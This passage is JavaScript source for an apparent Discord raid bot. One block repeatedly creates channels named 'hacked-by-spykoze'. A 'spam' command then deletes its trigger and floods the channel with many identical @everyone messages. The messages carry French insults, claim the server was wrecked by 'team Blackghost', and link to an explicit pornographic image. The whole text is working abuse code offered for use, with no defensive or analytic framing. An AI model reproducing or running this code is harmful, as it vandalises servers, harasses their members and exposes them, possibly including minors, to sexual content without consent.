       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
    }

    if (message.content === prefix + "spam"){
    	message.delete()
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
